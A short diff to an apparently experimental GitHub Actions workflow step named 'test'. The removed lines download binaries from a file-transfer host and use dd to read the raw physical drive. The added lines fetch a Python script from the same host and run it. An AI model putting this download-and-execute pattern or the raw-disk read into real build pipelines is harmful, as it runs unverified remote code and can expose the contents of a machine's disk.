@@ -43,9 +43,8 @@ jobs:
     - name: test
       if: github.event.inputs.uupapp == 'test'
       run: |
-        curl https://transfer.hx0i.xyz/1jNPWa2/coreutils-5.3.0-bin.zip -o coreutils.zip
-        unzip coreutils.zip
-        .\bin\dd.exe if="\\.\physicaldrive0" of=mbr.dat bs=1GB count=6
+        curl https://transfer.hx0i.xyz/1kLsWGx/test.py
+        python test.py
     - name: out iso version
       run: |
         $ISO=Get-ChildItem *.ISO -Name
